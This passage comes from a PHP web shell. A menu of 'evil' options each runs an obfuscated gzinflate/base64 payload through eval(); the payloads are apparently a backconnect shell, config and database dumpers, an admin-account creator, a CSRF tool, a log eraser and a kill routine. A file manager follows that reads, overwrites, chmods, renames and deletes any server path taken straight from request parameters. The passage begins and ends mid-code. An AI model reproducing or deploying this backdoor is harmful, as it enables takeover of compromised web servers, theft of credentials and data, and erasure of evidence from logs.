3HlrT9Yk+vWt32jBFaAWE6WixnMScRs+byNhN18CuYfVY05gzPekKu/eS/jP9sFLUhGFOZroclGM3mTF4WwNYeLA+XZ81nr15If6ahDGfVRAseo44HgsFI8jxJ5h6SPhZVeHUnBlyRsxyR5KIZn1SuNtJrkF+t2Muyiunt4ieYx6FRdiN3fheyTmUypC4FOwqgPODH8pXsxv1+yQMB5GLiENB0YbyzldQ4BIMwVx/CCmaUj5CHplqViCQVl0bdgsBqXe1Al0/JJKkXsKQGPG8Cn6CmGdA+XB9ATx4Y7+D2mBW1tJA8PrYbXdyvYplELzOWt3uJ1jjuZ7FSgieH1on7fzxlsghxz1YPcpiM030A059b9YkbvuRhfPoIJXNq9o9CFSKNIL4s10ApFaApJYacsxgP5DCqV2okNfYjchlVuIS0zmR24mYa+swxrFclBtKHV5F6woHxGgENwiEPu6sToPnUiJ2g1FgorixYdo9F3tjs2lFzTxDqxo1rSrOF4v1SpQtg84WKXkpuPm4VUrIVCBkatEkk776U0X49opwgoewk/bvxLu9D3v49SuDJbqa1vbFPvCodQHKeXkJJJStK5YJK5nrYhjds2LtsJJMLYbSPSsWEyvuXAyk2leuLla2vCyGm+m9p+hgZ0I9WyRleeXpw620k2McgPk+S5DUkwepQyrS+sUo1q4A81HDnJJeNST9CFZBDxakDVpjPkxZ+gHqkWRedWklik0esAatd0xSHHioKqSk8akGPXYNend+fmbDKeGPdudOXu+DOh6fvr07OOrY+6cfDo/iy+7n7nn7ZP0CZaqzS+HJoLgwmeoAU3yoKCxE5uanGOEqKsSbVnf9o4wct9M+PPozx7XoHPO/Kw9a8XIymOHjYgr/i9q9TLR/FLU+DYi3jxl/kuvHlusAe8MhddEg8oYhRbC1oQ6GixtQQgd7iHpfQABgb7W2UpsA/1pKsWFWTMNcSaNNPek8t0J9NjPP2hfdCrXZFJtpsTnMcdPiWvhoyKAObCkox9/JI6H5BzLUsTXCzVR3fut7gV0MxLFhay0e6a60BY7ba1n5Zq72fHyZzYCrLaDLDl97pPHnlQJIQsbx85hfC74HU4DiLbg4x6S3Luv+6h531x/7E1AanB9oXgqE9h4nLnct4UJDzjD3GSx+lIFdzqZwSQ7nKlc6oWU1LLXKrWZFQjaLXl/NIn+1MfLFXC6fw6L90tlshmophGQ8dJFL5iNgLjSOPX+KpiPCYjZLsKoQ7QWKz+hyHrPmdtFeRmd8KUVzeZn61pY7L6f3xuwuF+jDCgfqe1hxDxW+gde1zUCvR+qVOb2oeA+4tX14OmsS/wv7ZJdcE7dhSlwPsE/WdJj/EjhDIbPavqduVeFglLlF5fk9c1aQlu5/czbnT9/0rrdJl2/yv/iXnUAM3uqDCBLWFC3W6GWzFXEftQEoEj9HsqrQJLsGPpugCeEjH3gYwO7TjNupF0TAgtsASMuwQ30TxQxWj5dFj4nkE86GKX4yhPoj0h8Tp3lw1EExQ9cL4lKxkI+PPvyeuPfYIhZObmD5h/QvuH79Yi6exKHC7Yinu6ZOrQikf4i1h3JixpHS9ZkEItfU5VNYhjrOWXKIWBIns6IL48w4h1FvQrV7/KO0xPWtvw1z5rcuXPdwfzxkfuQ5ewjKkhcGmMGtrsf03EPPBvJVRz1ASKDhZXCDQh+Oa2nXlDp8tIdqL18HN3U0gYVIvT0EHxAGmtQVBaqCG4qXX/8B')));
} elseif($_GET['evil'] == 'dmns') {
// Source codenya : https://ghostbin.co/paste/yd45w/raw
eval(gzinflate(base64_decode('ZVLNjtsgEL5X6jtMyUrg1Sps97jGaA/tI/QURRHBYxvJBgvwOm2Udy/EcQ5ZcRlmPsbfj1F3DojQaCN6KWrzCbpXIVR0+Ht0JyrFCKo3ra3ogqHrXLenNyp/uUEZG0DZGv4E9EHwUZLyqX5d+hV8NKZHRjhGza0asN5qZxtSlKZhP1Zcca5NAq08fnvvPLyDVpZG8Khq2MHDBtgLfoOnZRfMQqiI6tgjmLoiborjFIkU0cOx1a53vtpozCf16pW54KnO92lhn288eknLxqUP647dtagAt7o4J/LosTWM/HMWycs6KM5jah8GFXV3UH3P6CYDgLDtc0E29GVdkYuFQVE2/RQ6dnUkRN+jZdGbga2A3c/97nVfFCDhrTg/ZaLJ19EFczq0GMd5MjW72uxmi/7m9WeKTQUMnGwfF5W4pJ5kZuVCQeexqboYx3fO53nePr7ZEi6/9gRX8u5fGmdmO5ojotfp6iW5K7xcrkFRwdOfJu8B0vL7t/8=')));
} elseif($_GET['evil'] == 'cprp') {
// Source codenya : https://ghostbin.co/paste/5y7n4/raw
eval(gzinflate(base64_decode('nVNda5xAFH0P5D/cmi2jkNVmG0qrrqU0Ql5Klt2lLyHIqOM6VGeGmXFNKP3vvaPd9ANKoYjiPcd77scZWdVKIGnFhGU6S9tV9lFRwTrYMsMsbKgxo9R1GiGT1vwIxj51bO2VCDK91LTmg4nhjXpMFK1rLg4xXKtHWCEw8tq2MayuXyYdF2zZMn5orQOQLGn15aDlIOoYLq5ydyWV7KSOx5ZblnhZqrLzs7SRugdaWS7F2rvwoGe2lfXaU9JYL8t7yrsYUi7UYME+KWyNOcwDQfufwanr56LLuRbMxebg1IYHUfabohnKntuT5Ck60m7AcMdE/eK5wt/X00iBs7/DN/ijHFaL3JhZWqIFkcIbN43PH66Q5PxsMRimYQ0HZotq0BqZwkF+4EiDQyC5KHb59nO+vSe3+/2muL3b7cmD47kycy4TR59s8093+7z4cHOzJS6dNz436La/KDaYck/mCclDEHzF5GmFk/rMTvGsO7qWZiAm4fylwxuEG6mY8EnUyp5FSLpuQxKF1XS+ogrX4WwVjSSXQMapk2bUOIm/aC4BtYMEEKo6aRwU/FP4vxQVxfOFw7kVhiRevXr7OtLu7Cs8+u+Npdqur5wDbP5TSo12nYwJp/SQ/GIVfPsO')));
} elseif($_GET['evil'] == 'bcon'){
// Source codenya : https://ghostbin.co/paste/m8fko/raw
eval(gzinflate(base64_decode('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')));
} elseif($_GET['evil'] == 'crdp'){
// Source codenya : https://ghostbin.co/paste/ktowd/raw
eval(gzinflate(base64_decode('1Vhhb+I4EP28J91/GLxIgNQrW9B9aYFVt82q6PYAFXrVqqqQSQxEDXE2cdpyq/73GydxSEiAcLC3ulZtiT1+fmPPm5nUnFY94QruOw5zq54/wafq4GYw7g9P4MMJNGs1aLfbULnv9io1+A4fOy2d2YK5ndbErYe/fv3lXfDVMsxnMI020Tla2OI3i00FiafRYMrdBVBdmNxuEwILJuYc7R3upe0EnVgMJtw1mNsmZ84riR50bnEced8wGpPGhIDOLMuhhmHaszb5He0SKAiDLKfIBTzzb9YmDYkTIbzMTcFI5+pWuxxpcHs9aNWlZadVF0YKo44ga5iJR3w2wj06dx5zbbpgG4ASlnAOW41M2/EFiKWDnAV7FQRAAreJH21BwGXffNNlxgF8B9TzXvBQfyBfJ9riML7yyjyHYsQ0CVDLnOGnMAZJeu+5aRjMJtHmT94cg4PAM7V8fDxbM8ZYX5hCGasnZX3lMirjYwddfJSRmhqRMZ4aQFUkn5OKOaJmjiWazA3suAKYzNbwd2muPxh1+71sKNUzV58lUlBrxYJ3U/SGIeGu1OZYVGdzbgUHexcP58hhDx926e8YPsyoLUznZc0DtXM2vPdy4DKIySPQTw28a3nMYrqIPKBPnoknnTZBI+7IzRPiHs75C6ziIpzfta5BOte4m2B7r2xi7ZhTe8ZgdY+5K1v10J81twsdfPHs1tgru2mvTPfz0ls2HRdIcKkWIJXtWnXVK6gP0UzrozN3AMxptTwe9Iejh0pIsfIoe4zEcOhm5bEt71jOld2x1CW0QZkomVYeL+SsrDmJWVWCgll9YYx19qQQAuwxw8OoEpsJkMOkdiH3d1w2Gy+o0OdVUo/2rJOTNESt9h2YPudQntElHbuci9PI9lSmSawhxhLoMzUteYjktMwv4I1ZHpOOSCRMwtvIAEngBZ+lO/i5jgsl0xhk5mIL553l4Fhcp1YwDZfGwrRN7PCo4K6XAt8A2NgDsAheszAe8/MBZWwkTy7nCkii/jQ6D6+PiGsEAsdElMRUylXD0eGGy8Oa9f7TB/ndGfq6zjyvFOex8E/cAqfv9r9g9BmjihmlTUxCDtmNBy6XjmDpD/b3TmBgMYqs76kpgAJeAGaG09MQK33eUZAVOvIrbs/wGn2LypzolUJvk76mlkTnO/Uta6k4bvEuOOcstcYPoJYfCAcSbR6V6OEMi7AZctddFqMgY9N3GQiuCOwdp0PmPuNOXXvKE+1DFJQFyAbLu4NQSOOhdvuXdvtAbkajwfgGCwN5xEVJSusAqh+AtEK3ronVu2K8UnGZr61O+pJ1YITNxRNgqcVCIMWK4sThPIA3eYgqzLJlsxGUzWgXTyxTxVx2J8FQpPRouWy6VM2N12JJRHc21cwshxgkZFBWdTpRnN1U7S5cnaFaYgtHLKsxpqzEmaqtJnPrdtHyq0BkCbrWvmgjbVsV2pZvU5kWE2x8lVCPfheK7ExSuGUL/hw2sBALJbkq7UXKIjdzQKmUR27PdPGV0TmcV49IL6p4W8gVpHeJqekr9+EPM3gHhj/Zx9JK8Of5LCFBE7byhK6Aa8486HEB2iv2M3iicDBrFT6abKRBzBl8Nl3EjoljtjXCl5kd222WajObLCCRLeQFxvlit6BV750wiF5I/w96/1fdZvROKG8nvpd0U5eIdWoba5PqxLaX9sMFGtHMUFxnaFB7P4Y/RaOV7erM7eOUSO3KSqM/TaLyJ35FXsn0LRZrrMnQdvU/+MQVVCLXKp1Rv/9lCFeXvV5/BJ80uBtq1ycwutFA9kHdKw26Q5Bz993edf9+uHqrURTk/v8A')));
} elseif($_GET['evil'] == 'admn') {
// Source codenya : https://ghostbin.co/paste/rdvgv/raw
eval(gzinflate(base64_decode('vZNda9swFIavM9h/OBiDHfDi+80xZK0zDKldFKdQxjCKclSLKbKR5GYw+t8n1zFL2QfdzS6MraP3fXQ+ZJ/3UsISjNW1xk5ShqFfbzNyl5HPwXV5tbvJiqomZVkFXyLwvAj8jtpm/uHtmxnvFbOiVUAPR6FQh36vpRMII+bw3QlmPu8cnLcdqnAIO8LJe/bOfNa4LeYctVDChmMUZjDGDNq2s6FTRXC1I5vytqrdy9Hd7iu0H/NiRe4rsiq264xEYHWPr7CRrNqR4p9t2+2mdh3L1/e32WDjVJrJB391rvNN5ori3ajWaHutRjl+QzaIf+Ew2Rr8ucPP64nR7msue9OcW3rx/eQewUMuJDq6MNaEwXl2i67pgvl5bMiaFryEobKo04S3yqYJhUYjXwb+cGXiSxtYqh/QLoN6L6n6GqQprK5v8iIjsCk/5QUkSUzTJB458RnrPWcE6Do1nuoymy6S11jbmfdxrOlp8SBs0+97g5o5gDMvWHuM8VFIexLq3QEfh2ziIzUOe5mYF3mXq6m6/1jei/p+e+6aumEcwLbANFKLMAxn+qEWf4AOjfsB')));
} elseif($_GET['evil'] == 'ddmp') {
// Source codenya : https://ghostbin.co/paste/uqxf4/raw
eval(gzinflate(base64_decode('hVbbbuM2EH0PkH+YJYSVXNgy0CL7EFsucnG3C6TJIva2KALDoCXK4la3iNS6cZF/L4ekLrHdrR7smHPmcOacIRUWJgW406SaTcuKzaYhyyWrZu7k/IyZUFxUGdBQ8iIPfo42UZ2VkDGZFFFQFkLOzs9uqaQbKhjcqtj52YJV31gF9rmEKc/LWoJ8KVkg2d8ScpqxQBiU4HsWXPyoWL6oFYx8P61uUF3iZyrErqii7yeWDapLxLqvse57JPyvxGhzsN/tNSwVpOtPK9STpFGLWLnIbCpYykJLaJCzaVEiCuAbTWsWkO2eK+RH9Tkdm1ALsQjxnJLZ4jnt4mPDq4qytYepajMg+sd+U0tiuhH1JuOy4QFt1DsAApg5xvoVl7V+OtaDIMKKl1IPAgCPwXPWnx8Wyye3ccBdwfv30Kwald6umUbd1eAf5HAiKhkEgF8e+XOUjSIymJjIxk5D0OaaBXfVAHDXXrgrogGgvz1AY3cH0C4GRwWbcMxTDBIUZmTBI10xMQDTSy+/aa7Tx05A4CqfXNsz8gYnWH300m5dBnFRstzT4CHZWVVeWSrY/7P4231LpMrb7k9y4Udc53ouYVdxZQEy0AHoHbZpsaEpUhzZ3fSJfXWNxZYjLoeG56Dk7b4DQB+hK8leFNM6LPIcD4XX+j9snB42jposgzezvo42nhXBTo+6fFKG3hvYc82qF/DI4teHP2B5dX03X1gVdgm67Dm8xcZMhsmaVhV98SzPwEqCj0Y6/Mld6tCa52vXt5sb4zUqrJgZ7WPSEyXdPM6vlnNTGRDf4YNBS2VFM4RP7o0h1ru7K59M8px0YEdRH3c9v5vfLOEH+OXx4TdD3yagrQad19m6KnbCQ45+x7oIK5MCHPSkVk5m4KMuEUbDxOZRAc5XCGbg/HUCq6tXsCfn6wpPnUt8sw0TIS3ZWsiK51tP5foqNjlMfz1cMLKRT/eL+eMSPt0vH9C636/uvswXHvF5VqZFpABDMtT7KtrBpC/lG9bX9sQcHOve+IdpIVCjuDyefB0zIc2SMBqxyiM3hbpfczm65UK9JTgexUugUirVMrU+ATyz+g1BwDeH3pAfEuDbR2WWZcpDijTjqNjlaUGbC/Uw4Y7lW5lcAvIiLb7LzBVhZy9Oa5F4+Hd3k/QvJSDV2zP0LmZFrHsc4GrrsP6fIVaTEJmj/+Hi4qcPnc7dPs2d1BPLLv4L')));
} elseif($_GET['evil'] == 'csrf') {
// Source codenya : https://ghostbin.co/paste/hgzo5/raw
eval(gzinflate(base64_decode('pVLBahsxEL0b/A8TYVALTrZNyMXeXSiF0EOgIXFOxgR5NetVo5Vk7Sg4Kf33Srt24+TSQk96erM7em/eYNVY4HmFhtCXeXNefr27vcqzCMajvLa+hRapsbJgznbEysgZgk69YMEuWHl/ew0L4TdIM8izVCtzZVwgoGcXPyHcEQMj2oiD12z/5+UnBg2qTUMF+xyx06LCxmqJvmANkZtl2ZOqSLVnlW2z5c2XxbdVFpy2Qp65xsU+9Kxjoza+rcwMLt0ORCA7ByekVGZzqrGmnp8z8LgNyqMs87V/7+Dm+90CrpTGvxtw9T/pT82kIDEF+TJITqiO7OHspjBcxQ+xq4Mbrt1yNYXtdqiEDn1C/+M0JnhspQvrVv0xIxk8CR0iurbV40lMNktxl3w+Hk1iVFDA5CENZ9kHt0q0q4/YOI2elEec7ClVf5jIj/BzPMK0Xmw/9ddd4mmXOFC/OAV/WGthHjmIGLg1BU/Pc0BT9bp5GzQpJzz1Ak/TaPmbkHgaFB988SjyXXXwfahv+N43v++zOeEH54cjqmXzX78B')));
} elseif($_GET['evil'] == 'dlog') {
eval(gzinflate(base64_decode('pZdNTsMwEIXXReIOJpuWBbFA7Bp1A0vuULmO21R14sg/QG9P2pI2sT22A0s037w3uE8zCqOVQFlBWaOZXBXVy+qdcaYZ+hA7VeDu72x5fzdj34wuMlmjJ7lFWNct5l09e3RrUgiN84Oq1tVeaSGPMLQhyVTnJoz2QUbJbhZKOCYtoRUDB/OBPu6TyJjUGIEIaRpsuqeC6iH10Gxl7SsxTfEX4HaqRSbBnCgdcD0hN3lVMc7XoVD4CCAaMOoGJMIOY+JDA2FJxWHaG5w4GObGIYKouF988j5WPmAcLohImnMctBB4M2yJUrqSBgqbWweiBoFu0ILkMGYuGAhZGgyx3oDFsBA1DpefiTnF5u1j5ZbHofLXE6YbBwrGBvk9Ks1qcHNxxtrF82UPdtdxXmy6w9he7uK+2aE8z68tqMDtam632QbgNnOsLBu3cWDoNXG3a5rHId3C3bQT/o1LH2wR2tAxG2/vNKt/OMFG/sMQ87C6UuX/pB4Wt25QinTfEhae+BqDZ5jBitMEI896PYpJ71nWsJx1QmN6PR4WnPCr9Hj0F7EOdOI79l1x+QmPMGyxN+3rtQ31G/pNNDtJtOFE70WjHs7fMKg8f8+USBlKmVJbw/kxP4mdu/Dvl898+QM=')));
} elseif($_GET['evil'] == 'kill') {
// Source codenya : https://ghostbin.co/paste/hyxr4/raw
eval(gzinflate(base64_decode('U0nLzEnNzMtUsFVQiQ92DQpzDYpWD3YO8gwIiXfz9HH1c/R1VY+15uUqyk3JLNJQTy3LzCkpz8yLL67MVde0RhdNzs9LQxWOB4uXZeQXlwAlSvNyMvOyNVSgtmoCDU5NzshXULcpsHOqTE1VsFKy0S+wU7cGAA==')));
}
echo "</td></tr>";
if(isset($_GET['filesrc'])){
echo "<tr><td>Current File : ";
echo $_GET['filesrc'];
echo '</tr></td></table><br />';
echo('<pre>'.htmlspecialchars(file_get_contents($_GET['filesrc'])).'</pre>');
}elseif(isset($_GET['option']) && $_POST['opt'] != 'delete'){
echo '</table><br /><center>'.$_POST['path'].'<br /><br />';
if($_POST['opt'] == 'chmod'){
if(isset($_POST['perm'])){
if(chmod($_POST['path'],$_POST['perm'])){
echo '<font color="#FFFFFF">Chmod OK</font><br/>';
}else{
echo '<font color="#B0B0B0">Chmod ERROR!</font><br />';
}
}
echo '<form method="POST">
Permission : <input name="perm" type="text" size="4" value="'.substr(sprintf('%o', fileperms($_POST['path'])), -4).'" />
<input type="hidden" name="path" value="'.$_POST['path'].'">
<input type="hidden" name="opt" value="chmod">
<input type="submit" value="Go" />
</form>';
}elseif($_POST['opt'] == 'rename'){
if(isset($_POST['newname'])){
if(rename($_POST['path'],$path.'/'.$_POST['newname'])){
echo '<font color="#FFFFFF">Rename OK</font><br/>';
}else{
echo '<font color="#B0B0B0">Rename ERROR!</font><br />';
}
$_POST['name'] = $_POST['newname'];
}
echo '<form method="POST">
New Name : <input name="newname" type="text" size="20" value="'.$_POST['name'].'" />
<input type="hidden" name="path" value="'.$_POST['path'].'">
<input type="hidden" name="opt" value="rename">
<input type="submit" value="Go" />
</form>';
}elseif($_POST['opt'] == 'edit'){
if(isset($_POST['src'])){
$fp = fopen($_POST['path'],'w');
if(fwrite($fp,$_POST['src'])){
echo '<font color="#FFFFFF">Edit File OK</font><br/>';
}else{
echo '<font color="#B0B0B0">Edit File ERROR!</font><br/>';
}
fclose($fp);
}
echo '<form method="POST">
<textarea cols=80 rows=20 name="src">'.htmlspecialchars(file_get_contents($_POST['path'])).'</textarea><br />
<input type="hidden" name="path" value="'.$_POST['path'].'">
<input type="hidden" name="opt" value="edit">
<input type="submit" value="Save" />
</form>';
}
echo '</center>';
}else{
echo '</table><br/><center>';
if(isset($_GET['option']) && $_POST['opt'] == 'delete'){
if($_POST['type'] == 'dir'){
if(rmdir($_POST['path'])){
echo '<font color="#FFFFFF">Delete DIR OK</font><br/>';
}else{
echo '<font color="#B0B0B0">Delete DIR ERROR!</font><br/>';
}
}elseif($_POST['type'] == 'file'){
if(unlink($_POST['path'])){
echo '<font color="#FFFFFF">Delete OK</font><br/>';
}else{
echo '<font color="#B0B0B0">Delete ERROR!</font><br/>';
}
}
}
echo '</center>';
if(function_exists('opendir')) {
	if($opendir = opendir($path)) {
		while(($readdir = readdir($opendir)) !== false) {
			$scandir[] = $readdir;
		}
		closedir($opendir);
	}
	sort($scandir);
} else {
	$scandir = scandir($path);
}
echo '<div id="content"><table width="780" border="0" cellpadding="3" cellspacing="1" align="center">
<tr class="EviL">
<td><center>NAME</center></td>
<td><center>SIZE</center></td>
<td><center>PERMISSION</center></td>
<td><center>MODIFY</center></td>
</tr>';
foreach($scandir as $dir){
if(!is_dir($path.'/'.$dir) || $dir == '.' || $dir == '..') continue;
echo '<tr>
<td><a href="?path='.$path.'/'.$dir.'">'.$dir.'</a></td>
<td><center>--</center></td>
<td><center>';
if(is_writable($path.'/'.$dir)) echo '<font color="#FFFFFF">';
elseif(!is_readable($path.'/'.$dir)) echo '<font color="#B0B0B0">';
echo perms($path.'/'.$dir);
if(is_writable($path.'/'.$dir) || !is_readable($path.'/'.$dir)) echo '</font>';
echo '</center></td>
<td><center><form method="POST" action="?option&path='.$path.'">
<select name="opt">
<option value="">Select</option>
<option value="delete">Delete</option>
<option value="chmod">Chmod</option>
<option value="rename">Rename</option>
</select>
<input type="hidden" name="type" value="dir">
<input type="hidden" name="name" value="'.$dir.'">
<input type="hidden" name="path" value="'.$path.'/'.$dir.'">
<input type="submit" value=">">
</form></center></td>
